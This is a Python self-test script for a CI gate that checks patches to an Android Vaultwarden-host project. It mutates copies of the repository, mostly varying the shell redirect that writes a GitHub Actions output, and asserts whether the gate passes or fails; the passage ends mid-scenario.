#!/usr/bin/env python3
"""Uji-diri gerbang verifikasi-patch (Audit 782).

Perilaku cabang langka gerbang — fail-keras tanpa PyYAML (Audit 758/770),
sumber lokal berkas_dihapus + gabungan mode --semua (759/763/771/775/777),
dan cabang kedua strings.xml kosong = GAGAL (765) — tidak pernah terpicu
pada lari permanen: CI selalu memakai --rentang dengan PyYAML terpasang,
jadi regresinya tak akan membuat lari mana pun merah. Skrip ini
menguncinya secara permanen: tiap skenario dijalankan pada salinan
buang pohon kerja yang di-commit sebagai snapshot git lokal (pohon asli
tak disentuh; cara ini juga kebal keadaan checkout CI yang dangkal/
detached) dan harapan keluarannya diasersikan.

Jalankan: python3 tools/uji-verifikasi.py (berhenti dengan kode 1 bila
ada skenario yang menyimpang).
"""

import os
import shutil
import subprocess
import sys
import tempfile

AKAR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
GERBANG = os.path.join("tools", "verifikasi-patch.py")
KELAS = "app/src/main/java/com/tasirin/vaultwardenhost/DialogAman.java"
GAGAL = []


def jalan(cwd, perintah, env=None):
    e = dict(os.environ)
    if env:
        e.update(env)
    p = subprocess.run(perintah, cwd=cwd, env=e, stdout=subprocess.PIPE,
                       stderr=subprocess.STDOUT, text=True)
    return p.returncode, p.stdout


def git(repo, *args):
    rc, out = jalan(repo, ["git", "-c", "safe.directory=*", *args])
    if rc != 0:
        raise RuntimeError("git gagal: %s\n%s" % (args, out))
    return out


def klon(tmp, nama):
    # Salinan pohon kerja (tanpa .git) yang di-init + di-commit snapshot:
    # menguji persis pohon yang sedang diperiksa CI, tanpa bergantung pada
    # riwayat/upstream repo asal, dan ringan (pohon kerja hanya beberapa
    # MB; klon penuh menyalin ratusan MB riwayat dan memenuhi /tmp kecil).
    tujuan = os.path.join(tmp, nama)
    shutil.copytree(AKAR, tujuan, ignore=shutil.ignore_patterns(
        ".git", "__pycache__"))
    git(tujuan, "init", "-q")
    git(tujuan, "config", "user.email", "uji@lokal")
    git(tujuan, "config", "user.name", "Uji Gerbang")
    git(tujuan, "add", "-A")
    git(tujuan, "commit", "-q", "-m", "snapshot uji")
    # Commit kosong kedua: gerbang pada mode tanpa --rentang memakai diff
    # cadangan HEAD~1...HEAD bila upstream tak ada; repo berkomit tunggal
    # membuat diff itu gagal dan gerbang GAGAL keras (bukan LOLOS) — dua
    # commit adalah riwayat minimum agar kontrol bersih bisa lulus.
    git(tujuan, "commit", "-q", "--allow-empty", "-m", "riwayat cadangan")
    return tujuan


def periksa(nama, ok, detail=""):
    print("%s %s %s" % ("LOLOS " if ok else "GAGAL ", nama, detail))
    if not ok:
        GAGAL.append(nama)


def main():
    with tempfile.TemporaryDirectory(prefix="uji-verifikasi-") as tmp:
        bersih = klon(tmp, "bersih")
        rc, out = jalan(bersih, [sys.executable, GERBANG, "--semua"])
        periksa("kontrol: pohon bersih lolos --semua", rc == 0,
                "" if rc == 0 else out[-400:])

        blok = os.path.join(tmp, "blokir")
        os.mkdir(blok)
        with open(os.path.join(blok, "yaml.py"), "w") as f:
            f.write("raise ImportError('diblokir uji')\n")
        rc, out = jalan(bersih, [sys.executable, GERBANG, "--semua"],
                        env={"PYTHONPATH": blok})
        periksa("tanpa PyYAML: gerbang gagal keras (Audit 758/770)",
                rc != 0 and "PyYAML tak tersedia" in out)
        shutil.rmtree(bersih, ignore_errors=True)

        hapus = klon(tmp, "hapus")
        git(hapus, "rm", "-q", KELAS)
        rc, out = jalan(hapus, [sys.executable, GERBANG])
        periksa("mode lokal: hapusan staged tertangkap (Audit 759/763)",
                rc != 0 and "DialogAman" in out)
        rc, out = jalan(hapus, [sys.executable, GERBANG, "--semua",
                                "README.md"])
        periksa("mode --semua <jalur>: sumber lokal tetap ikut (Audit 775)",
                rc != 0 and "DialogAman" in out)
        shutil.rmtree(hapus, ignore_errors=True)

        kosong = klon(tmp, "kosong")
        isi = ('<?xml version="1.0" encoding="utf-8"?>\n'
               "<resources></resources>\n")
        for rel in ("app/src/main/res/values/strings.xml",
                    "app/src/main/res/values-in/strings.xml"):
            with open(os.path.join(kosong, rel), "w") as f:
                f.write(isi)
        rc, out = jalan(kosong, [sys.executable, GERBANG, "--semua"])
        periksa("kedua strings.xml kosong: gerbang gagal (Audit 765)",
                rc != 0 and "Kedua strings.xml" in out)
        shutil.rmtree(kosong, ignore_errors=True)

        nonascii = klon(tmp, "nonascii")
        with open(os.path.join(nonascii, "data-\u00fc.zip"), "wb") as f:
            f.write(b"PK\x03\x04")
        git(nonascii, "add", "-A")
        git(nonascii, "commit", "-q", "-m", "uji non-ascii")
        rc, out = jalan(nonascii, [sys.executable, GERBANG,
                                   "--rentang", "HEAD~1..HEAD"])
        periksa("berkas terlarang bernama non-ASCII tertangkap (Audit 812)",
                rc != 0 and "data-\u00fc.zip" in out)
        shutil.rmtree(nonascii, ignore_errors=True)

        hilang = klon(tmp, "hilang")
        os.remove(os.path.join(hilang, ".github", "workflows", "gitleaks.yml"))
        rc, out = jalan(hilang, [sys.executable, GERBANG, "--semua"])
        periksa("workflow wajib hilang: gerbang gagal (Audit 813)",
                rc != 0 and "gitleaks.yml" in out)
        shutil.rmtree(hilang, ignore_errors=True)

        kontrak = klon(tmp, "kontrak")
        berkas_action = os.path.join(kontrak, ".github", "actions",
                                     "resolve-vw", "action.yml")
        with open(berkas_action, encoding="utf-8") as f:
            isi_action = f.read()
        with open(berkas_action, "w", encoding="utf-8") as f:
            f.write(isi_action.replace("\n  tag_mentah:\n",
                                       "\n  tagmentah:\n"))
        rc, out = jalan(kontrak, [sys.executable, GERBANG, "--semua"])
        periksa("keluaran resolve-vw diganti nama: gerbang gagal (Audit 814)",
                rc != 0 and "tag_mentah" in out)
        shutil.rmtree(kontrak, ignore_errors=True)

        gradle = klon(tmp, "gradle")
        berkas_settings = os.path.join(gradle, "settings.gradle.kts")
        with open(berkas_settings, encoding="utf-8") as f:
            isi_settings = f.read()
        with open(berkas_settings, "w", encoding="utf-8") as f:
            f.write(isi_settings.replace("FAIL_ON_PROJECT_REPOS",
                                         "PREFER_PROJECT"))
        rc, out = jalan(gradle, [sys.executable, GERBANG, "--semua"])
        periksa("repositoriesMode dilonggarkan: gerbang gagal (Audit 815)",
                rc != 0 and "FAIL_ON_PROJECT_REPOS" in out)
        shutil.rmtree(gradle, ignore_errors=True)

        umpan = klon(tmp, "umpan")
        berkas_ump = os.path.join(umpan, ".github", "actions",
                                  "resolve-vw", "action.yml")
        with open(berkas_ump, encoding="utf-8") as f:
            isi_ump = f.read()
        with open(berkas_ump, "w", encoding="utf-8") as f:
            f.write(isi_ump.replace(
                'echo "tag_mentah=$TAG" >> "$GITHUB_OUTPUT"',
                'echo "tagmentah=$TAG" >> "$GITHUB_OUTPUT"\n'
                '        echo "tag_mentah=$TAG"'))
        rc, out = jalan(umpan, [sys.executable, GERBANG, "--semua"])
        periksa("echo log umpan nama produsen: gerbang gagal (Audit 867)",
                rc != 0 and "tag_mentah" in out)
        shutil.rmtree(umpan, ignore_errors=True)

        umpankomen = klon(tmp, "umpankomen")
        berkas_uk = os.path.join(umpankomen, ".github", "actions",
                                 "resolve-vw", "action.yml")
        with open(berkas_uk, encoding="utf-8") as f:
            isi_uk = f.read()
        with open(berkas_uk, "w", encoding="utf-8") as f:
            f.write(isi_uk.replace(
                'echo "tag_mentah=$TAG" >> "$GITHUB_OUTPUT"',
                'echo "tagmentah=$TAG" >> "$GITHUB_OUTPUT"\n'
                '        # echo "tag_mentah=$TAG" >> "$GITHUB_OUTPUT"'))
        rc, out = jalan(umpankomen, [sys.executable, GERBANG, "--semua"])
        periksa("baris komentar shell nama produsen: gerbang gagal (Audit 872)",
                rc != 0 and "tag_mentah" in out)
        shutil.rmtree(umpankomen, ignore_errors=True)

        umpanmajemuk = klon(tmp, "umpanmajemuk")
        berkas_um = os.path.join(umpanmajemuk, ".github", "actions",
                                 "resolve-vw", "action.yml")
        with open(berkas_um, encoding="utf-8") as f:
            isi_um = f.read()
        with open(berkas_um, "w", encoding="utf-8") as f:
            f.write(isi_um.replace(
                'echo "tag_mentah=$TAG" >> "$GITHUB_OUTPUT"',
                'echo "tag_mentah=umpan"; '
                'echo "tagmentah=$TAG" >> "$GITHUB_OUTPUT"'))
        rc, out = jalan(umpanmajemuk, [sys.executable, GERBANG, "--semua"])
        periksa("echo umpan baris majemuk nama produsen: gerbang gagal (Audit 872)",
                rc != 0 and "tag_mentah" in out)
        shutil.rmtree(umpanmajemuk, ignore_errors=True)

        umpankutip = klon(tmp, "umpankutip")
        berkas_uq = os.path.join(umpankutip, ".github", "actions",
                                 "resolve-vw", "action.yml")
        with open(berkas_uq, encoding="utf-8") as f:
            isi_uq = f.read()
        with open(berkas_uq, "w", encoding="utf-8") as f:
            f.write(isi_uq.replace(
                'echo "tag_mentah=$TAG" >> "$GITHUB_OUTPUT"',
                'echo "tagmentah=$TAG" >> "$GITHUB_OUTPUT"\n'
                '        echo "catatan; echo tag_mentah=x >> $GITHUB_OUTPUT"'))
        rc, out = jalan(umpankutip, [sys.executable, GERBANG, "--semua"])
        periksa("titik koma dalam kutip nama produsen: gerbang gagal (Audit 874)",
                rc != 0 and "tag_mentah" in out)
        shutil.rmtree(umpankutip, ignore_errors=True)

        prodtrue = klon(tmp, "prodtrue")
        berkas_pt = os.path.join(prodtrue, ".github", "actions",
                                 "resolve-vw", "action.yml")
        with open(berkas_pt, encoding="utf-8") as f:
            isi_pt = f.read()
        with open(berkas_pt, "w", encoding="utf-8") as f:
            f.write(isi_pt.replace(
                'echo "tag_mentah=$TAG" >> "$GITHUB_OUTPUT"',
                'echo "tag_mentah=$TAG" >> "$GITHUB_OUTPUT" || true'))
        rc, out = jalan(prodtrue, [sys.executable, GERBANG, "--semua"])
        periksa("produsen sah sufiks || true: gerbang lolos (Audit 875)",
                rc == 0)
        shutil.rmtree(prodtrue, ignore_errors=True)

        prodkutip1 = klon(tmp, "prodkutip1")
        berkas_pk = os.path.join(prodkutip1, ".github", "actions",
                                 "resolve-vw", "action.yml")
        with open(berkas_pk, encoding="utf-8") as f:
            isi_pk = f.read()
        with open(berkas_pk, "w", encoding="utf-8") as f:
            f.write(isi_pk.replace(
                'echo "tag_mentah=$TAG" >> "$GITHUB_OUTPUT"',
                "echo 'tag_mentah=$TAG' >> \"$GITHUB_OUTPUT\""))
        rc, out = jalan(prodkutip1, [sys.executable, GERBANG, "--semua"])
        periksa("produsen sah echo kutip tunggal: gerbang lolos (Audit 875)",
                rc == 0)
        shutil.rmtree(prodkutip1, ignore_errors=True)

        prodkom = klon(tmp, "prodkom")
        berkas_aksi8 = os.path.join(
            prodkom, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi8, encoding="utf-8") as f:
            isi_aksi8 = f.read()
        baris_tulis8 = [b for b in isi_aksi8.splitlines()
                        if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru8 = isi_aksi8.replace(
                baris_tulis8, baris_tulis8 + " # tulis keluaran", 1)
        assert isi_baru8 != isi_aksi8, \
            "suntikan aksi8 tidak menembak"
        with open(berkas_aksi8, "w", encoding="utf-8") as f:
            f.write(isi_baru8)
        rc, out = jalan(prodkom, [sys.executable, GERBANG, "--semua"])
        periksa("produsen ber-komentar akhir baris: gerbang lolos (Audit 878)",
                rc == 0)
        shutil.rmtree(prodkom, ignore_errors=True)

        umpankomen = klon(tmp, "umpankomen")
        berkas_aksi9 = os.path.join(
            umpankomen, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi9, encoding="utf-8") as f:
            isi_aksi9 = f.read()
        baris_tulis9 = [b for b in isi_aksi9.splitlines()
                        if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_aksi9 = isi_aksi9.replace(
            'echo "tag_mentah=', 'echo "salah_nama=', 1)
        isi_aksi9 = isi_aksi9.replace(
            baris_tulis9.replace("tag_mentah", "salah_nama"),
            baris_tulis9.replace("tag_mentah", "salah_nama")
            + '\n          echo "catatan" # komentar && echo'
            ' "tag_mentah=$TAG" >> "$GITHUB_OUTPUT"', 1)
        with open(berkas_aksi9, "w", encoding="utf-8") as f:
            f.write(isi_aksi9)
        rc, out = jalan(umpankomen, [sys.executable, GERBANG, "--semua"])
        periksa("produsen semu di komentar tengah baris: gerbang gagal (Audit 881)",
                rc != 0 and "tag_mentah" in out)
        shutil.rmtree(umpankomen, ignore_errors=True)

        tempel = klon(tmp, "tempel")
        berkas_aksi10 = os.path.join(
            tempel, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi10, encoding="utf-8") as f:
            isi_aksi10 = f.read()
        baris_tulis10 = [b for b in isi_aksi10.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru10 = isi_aksi10.replace(
                baris_tulis10,
                baris_tulis10.replace('>> "$GITHUB_OUTPUT"',
                                      '>> "$GITHUB_OUTPUT"#semu'), 1)
        assert isi_baru10 != isi_aksi10, \
            "suntikan aksi10 tidak menembak"
        with open(berkas_aksi10, "w", encoding="utf-8") as f:
            f.write(isi_baru10)
        rc, out = jalan(tempel, [sys.executable, GERBANG, "--semua"])
        periksa("target redirect berekor # menempel: gerbang gagal (Audit 882)",
                rc != 0 and "tag_mentah" in out)
        shutil.rmtree(tempel, ignore_errors=True)

        umpankurung = klon(tmp, "umpankurung")
        berkas_aksi11 = os.path.join(
            umpankurung, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi11, encoding="utf-8") as f:
            isi_aksi11 = f.read()
        baris_tulis11 = [b for b in isi_aksi11.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_aksi11 = isi_aksi11.replace(
            'echo "tag_mentah=', 'echo "salah_nama=', 1)
        isi_aksi11 = isi_aksi11.replace(
            baris_tulis11.replace("tag_mentah", "salah_nama"),
            baris_tulis11.replace("tag_mentah", "salah_nama")
            + '\n          (true)#teks; echo "tag_mentah=$TAG"'
            ' >> "$GITHUB_OUTPUT"', 1)
        with open(berkas_aksi11, "w", encoding="utf-8") as f:
            f.write(isi_aksi11)
        rc, out = jalan(umpankurung, [sys.executable, GERBANG, "--semua"])
        periksa("produsen semu di komentar sesudah kurung tutup: gerbang gagal (Audit 884)",
                rc != 0 and "tag_mentah" in out)
        shutil.rmtree(umpankurung, ignore_errors=True)

        dualredir = klon(tmp, "dualredir")
        berkas_aksi12 = os.path.join(
            dualredir, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi12, encoding="utf-8") as f:
            isi_aksi12 = f.read()
        baris_tulis12 = [b for b in isi_aksi12.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru12 = isi_aksi12.replace(
                baris_tulis12,
                baris_tulis12.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '>> "$GITHUB_OUTPUT.bak" >> "$GITHUB_OUTPUT"'), 1)
        assert isi_baru12 != isi_aksi12, \
            "suntikan aksi12 tidak menembak"
        with open(berkas_aksi12, "w", encoding="utf-8") as f:
            f.write(isi_baru12)
        rc, out = jalan(dualredir, [sys.executable, GERBANG, "--semua"])
        periksa("redirect ganda target terakhir keluaran: gerbang lolos (Audit 885)",
                rc == 0)
        shutil.rmtree(dualredir, ignore_errors=True)

        bungkus = klon(tmp, "bungkus")
        berkas_aksi13 = os.path.join(
            bungkus, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi13, encoding="utf-8") as f:
            isi_aksi13 = f.read()
        baris_tulis13 = [b for b in isi_aksi13.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        indent13 = baris_tulis13[:len(baris_tulis13)
                                  - len(baris_tulis13.lstrip())]
        isi_baru13 = isi_aksi13.replace(
                baris_tulis13,
                indent13 + "{ " + baris_tulis13.strip() + "; }", 1)
        assert isi_baru13 != isi_aksi13, \
            "suntikan aksi13 tidak menembak"
        with open(berkas_aksi13, "w", encoding="utf-8") as f:
            f.write(isi_baru13)
        rc, out = jalan(bungkus, [sys.executable, GERBANG, "--semua"])
        periksa("produsen dibungkus grup shell: gerbang lolos (Audit 886)",
                rc == 0)
        shutil.rmtree(bungkus, ignore_errors=True)

        subkulit = klon(tmp, "subkulit")
        berkas_aksi14 = os.path.join(
            subkulit, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi14, encoding="utf-8") as f:
            isi_aksi14 = f.read()
        baris_tulis14 = [b for b in isi_aksi14.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        indent14 = baris_tulis14[:len(baris_tulis14)
                                  - len(baris_tulis14.lstrip())]
        isi_baru14 = isi_aksi14.replace(
                baris_tulis14,
                indent14 + "(" + baris_tulis14.strip() + ")", 1)
        assert isi_baru14 != isi_aksi14, \
            "suntikan aksi14 tidak menembak"
        with open(berkas_aksi14, "w", encoding="utf-8") as f:
            f.write(isi_baru14)
        rc, out = jalan(subkulit, [sys.executable, GERBANG, "--semua"])
        periksa("produsen dibungkus subshell: gerbang lolos (Audit 887)",
                rc == 0)
        shutil.rmtree(subkulit, ignore_errors=True)

        rantaiatau = klon(tmp, "rantaiatau")
        berkas_aksi15 = os.path.join(
            rantaiatau, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi15, encoding="utf-8") as f:
            isi_aksi15 = f.read()
        baris_tulis15 = [b for b in isi_aksi15.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        indent15 = baris_tulis15[:len(baris_tulis15)
                                  - len(baris_tulis15.lstrip())]
        isi_baru15 = isi_aksi15.replace(
                baris_tulis15,
                indent15 + 'test -n "$TAG" || '
                + baris_tulis15.strip(), 1)
        assert isi_baru15 != isi_aksi15, \
            "suntikan aksi15 tidak menembak"
        with open(berkas_aksi15, "w", encoding="utf-8") as f:
            f.write(isi_baru15)
        rc, out = jalan(rantaiatau, [sys.executable, GERBANG, "--semua"])
        periksa("produsen sesudah operator ||: gerbang lolos (Audit 888)",
                rc == 0)
        shutil.rmtree(rantaiatau, ignore_errors=True)

        potongakhir = klon(tmp, "potongakhir")
        berkas_aksi16 = os.path.join(
            potongakhir, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi16, encoding="utf-8") as f:
            isi_aksi16 = f.read()
        baris_tulis16 = [b for b in isi_aksi16.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru16 = isi_aksi16.replace(
                baris_tulis16,
                baris_tulis16.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '>> "$GITHUB_OUTPUT.bak" > "$GITHUB_OUTPUT"'), 1)
        assert isi_baru16 != isi_aksi16, \
            "suntikan aksi16 tidak menembak"
        with open(berkas_aksi16, "w", encoding="utf-8") as f:
            f.write(isi_baru16)
        rc, out = jalan(potongakhir, [sys.executable, GERBANG, "--semua"])
        periksa("redirect terakhir > tunggal ke keluaran: gerbang lolos (Audit 889)",
                rc == 0)
        shutil.rmtree(potongakhir, ignore_errors=True)

        fddua = klon(tmp, "fddua")
        berkas_aksi17 = os.path.join(
            fddua, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi17, encoding="utf-8") as f:
            isi_aksi17 = f.read()
        baris_tulis17 = [b for b in isi_aksi17.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru17 = isi_aksi17.replace(
                baris_tulis17,
                baris_tulis17.replace('>> "$GITHUB_OUTPUT"',
                                      '2>> "$GITHUB_OUTPUT"'), 1)
        assert isi_baru17 != isi_aksi17, \
            "suntikan aksi17 tidak menembak"
        with open(berkas_aksi17, "w", encoding="utf-8") as f:
            f.write(isi_baru17)
        rc, out = jalan(fddua, [sys.executable, GERBANG, "--semua"])
        periksa("redirect stderr 2>> bukan produsen: gerbang gagal (Audit 890)",
                rc != 0 and "tag_mentah" in out
                and "tak pernah ditulis" in out)
        shutil.rmtree(fddua, ignore_errors=True)

        targetpolos = klon(tmp, "targetpolos")
        berkas_aksi18 = os.path.join(
            targetpolos, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi18, encoding="utf-8") as f:
            isi_aksi18 = f.read()
        baris_tulis18 = [b for b in isi_aksi18.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru18 = isi_aksi18.replace(
                baris_tulis18,
                baris_tulis18.replace('>> "$GITHUB_OUTPUT"',
                                      '>> ${GITHUB_OUTPUT}'), 1)
        assert isi_baru18 != isi_aksi18, \
            "suntikan aksi18 tidak menembak"
        with open(berkas_aksi18, "w", encoding="utf-8") as f:
            f.write(isi_baru18)
        rc, out = jalan(targetpolos, [sys.executable, GERBANG, "--semua"])
        periksa("target polos kurung tanpa kutip: gerbang lolos (Audit 891)",
                rc == 0)
        shutil.rmtree(targetpolos, ignore_errors=True)

        paksa = klon(tmp, "paksa")
        berkas_aksi19 = os.path.join(
            paksa, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi19, encoding="utf-8") as f:
            isi_aksi19 = f.read()
        baris_tulis19 = [b for b in isi_aksi19.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru19 = isi_aksi19.replace(
                baris_tulis19,
                baris_tulis19.replace('>> "$GITHUB_OUTPUT"',
                                      '>| "$GITHUB_OUTPUT"'), 1)
        assert isi_baru19 != isi_aksi19, \
            "suntikan aksi19 tidak menembak"
        with open(berkas_aksi19, "w", encoding="utf-8") as f:
            f.write(isi_baru19)
        rc, out = jalan(paksa, [sys.executable, GERBANG, "--semua"])
        periksa("redirect clobber >|: gerbang lolos (Audit 892)",
                rc == 0)
        shutil.rmtree(paksa, ignore_errors=True)

        keduafd = klon(tmp, "keduafd")
        berkas_aksi20 = os.path.join(
            keduafd, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi20, encoding="utf-8") as f:
            isi_aksi20 = f.read()
        baris_tulis20 = [b for b in isi_aksi20.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru20 = isi_aksi20.replace(
                baris_tulis20,
                baris_tulis20.replace('>> "$GITHUB_OUTPUT"',
                                      '>& "$GITHUB_OUTPUT"'), 1)
        assert isi_baru20 != isi_aksi20, \
            "suntikan aksi20 tidak menembak"
        with open(berkas_aksi20, "w", encoding="utf-8") as f:
            f.write(isi_baru20)
        rc, out = jalan(keduafd, [sys.executable, GERBANG, "--semua"])
        periksa("redirect >& ke berkas: gerbang lolos (Audit 893)",
                rc == 0)
        shutil.rmtree(keduafd, ignore_errors=True)

        bacatulis = klon(tmp, "bacatulis")
        berkas_aksi21 = os.path.join(
            bacatulis, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi21, encoding="utf-8") as f:
            isi_aksi21 = f.read()
        baris_tulis21 = [b for b in isi_aksi21.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru21 = isi_aksi21.replace(
                baris_tulis21,
                baris_tulis21.replace('>> "$GITHUB_OUTPUT"',
                                      '<> "$GITHUB_OUTPUT"'), 1)
        assert isi_baru21 != isi_aksi21, \
            "suntikan aksi21 tidak menembak"
        with open(berkas_aksi21, "w", encoding="utf-8") as f:
            f.write(isi_baru21)
        rc, out = jalan(bacatulis, [sys.executable, GERBANG, "--semua"])
        periksa("redirect <> stdin bukan produsen: gerbang gagal (Audit 894)",
                rc != 0 and "tag_mentah" in out
                and "tak pernah ditulis" in out)
        shutil.rmtree(bacatulis, ignore_errors=True)

        opganda = klon(tmp, "opganda")
        berkas_aksi22 = os.path.join(
            opganda, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi22, encoding="utf-8") as f:
            isi_aksi22 = f.read()
        baris_tulis22 = [b for b in isi_aksi22.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru22 = isi_aksi22.replace(
                baris_tulis22,
                baris_tulis22.replace('>> "$GITHUB_OUTPUT"',
                                      '>> > "$GITHUB_OUTPUT"'), 1)
        assert isi_baru22 != isi_aksi22, \
            "suntikan aksi22 tidak menembak"
        with open(berkas_aksi22, "w", encoding="utf-8") as f:
            f.write(isi_baru22)
        rc, out = jalan(opganda, [sys.executable, GERBANG, "--semua"])
        periksa("operator ganda >> > bukan produsen: gerbang gagal (Audit 895)",
                rc != 0 and "tag_mentah" in out
                and "tak pernah ditulis" in out)
        shutil.rmtree(opganda, ignore_errors=True)

        lampau = klon(tmp, "lampau")
        berkas_aksi23 = os.path.join(
            lampau, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi23, encoding="utf-8") as f:
            isi_aksi23 = f.read()
        baris_tulis23 = [b for b in isi_aksi23.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru23 = isi_aksi23.replace(
                baris_tulis23,
                baris_tulis23.replace('>> "$GITHUB_OUTPUT"',
                                      '>>| "$GITHUB_OUTPUT"'), 1)
        assert isi_baru23 != isi_aksi23, \
            "suntikan aksi23 tidak menembak"
        with open(berkas_aksi23, "w", encoding="utf-8") as f:
            f.write(isi_baru23)
        rc, out = jalan(lampau, [sys.executable, GERBANG, "--semua"])
        periksa("append+clobber >>| bukan produsen: gerbang gagal (Audit 896)",
                rc != 0 and "tag_mentah" in out
                and "tak pernah ditulis" in out)
        shutil.rmtree(lampau, ignore_errors=True)

        sufiks = klon(tmp, "sufiks")
        berkas_aksi24 = os.path.join(
            sufiks, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi24, encoding="utf-8") as f:
            isi_aksi24 = f.read()
        baris_tulis24 = [b for b in isi_aksi24.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru24 = isi_aksi24.replace(
                baris_tulis24,
                baris_tulis24.replace('>> "$GITHUB_OUTPUT"',
                                      '>> $GITHUB_OUTPUT}'), 1)
        assert isi_baru24 != isi_aksi24, \
            "suntikan aksi24 tidak menembak"
        with open(berkas_aksi24, "w", encoding="utf-8") as f:
            f.write(isi_baru24)
        rc, out = jalan(sufiks, [sys.executable, GERBANG, "--semua"])
        periksa("sufiks kurung nama berkas bukan produsen: gerbang gagal (Audit 897)",
                rc != 0 and "tag_mentah" in out
                and "tak pernah ditulis" in out)
        shutil.rmtree(sufiks, ignore_errors=True)

        kurangspasi = klon(tmp, "kurangspasi")
        berkas_aksi25 = os.path.join(
            kurangspasi, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi25, encoding="utf-8") as f:
            isi_aksi25 = f.read()
        baris_tulis25 = [b for b in isi_aksi25.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru25 = isi_aksi25.replace(
                baris_tulis25,
                baris_tulis25.replace('>> "$GITHUB_OUTPUT"',
                                      '< > "$GITHUB_OUTPUT"'), 1)
        assert isi_baru25 != isi_aksi25, \
            "suntikan aksi25 tidak menembak"
        with open(berkas_aksi25, "w", encoding="utf-8") as f:
            f.write(isi_baru25)
        rc, out = jalan(kurangspasi, [sys.executable, GERBANG, "--semua"])
        periksa("bentuk < > berjarak bukan produsen: gerbang gagal (Audit 898)",
                rc != 0 and "tag_mentah" in out
                and "tak pernah ditulis" in out)
        shutil.rmtree(kurangspasi, ignore_errors=True)

        subekor = klon(tmp, "subekor")
        berkas_aksi26 = os.path.join(
            subekor, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi26, encoding="utf-8") as f:
            isi_aksi26 = f.read()
        baris_tulis26 = [b for b in isi_aksi26.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru26 = isi_aksi26.replace(
                baris_tulis26,
                baris_tulis26 + " $(true > /dev/null)", 1)
        assert isi_baru26 != isi_aksi26, \
            "suntikan aksi26 tidak menembak"
        with open(berkas_aksi26, "w", encoding="utf-8") as f:
            f.write(isi_baru26)
        rc, out = jalan(subekor, [sys.executable, GERBANG, "--semua"])
        periksa("redirect dalam substitusi ekor tak menimpa: gerbang lolos (Audit 899)",
                rc == 0)
        shutil.rmtree(subekor, ignore_errors=True)

        subarg = klon(tmp, "subarg")
        berkas_aksi27 = os.path.join(
            subarg, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi27, encoding="utf-8") as f:
            isi_aksi27 = f.read()
        baris_tulis27 = [b for b in isi_aksi27.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru27 = isi_aksi27.replace(
                baris_tulis27,
                baris_tulis27.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '$(true >> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru27 != isi_aksi27, \
            "suntikan aksi27 tidak menembak"
        with open(berkas_aksi27, "w", encoding="utf-8") as f:
            f.write(isi_baru27)
        rc, out = jalan(subarg, [sys.executable, GERBANG, "--semua"])
        periksa("redirect dalam substitusi argumen bukan produsen: gerbang gagal (Audit 900)",
                rc != 0 and "tag_mentah" in out
                and "tak pernah ditulis" in out)
        shutil.rmtree(subarg, ignore_errors=True)

        proses = klon(tmp, "proses")
        berkas_aksi28 = os.path.join(
            proses, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi28, encoding="utf-8") as f:
            isi_aksi28 = f.read()
        baris_tulis28 = [b for b in isi_aksi28.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru28 = isi_aksi28.replace(
                baris_tulis28,
                baris_tulis28.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '>(cat >> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru28 != isi_aksi28, \
            "suntikan aksi28 tidak menembak"
        with open(berkas_aksi28, "w", encoding="utf-8") as f:
            f.write(isi_baru28)
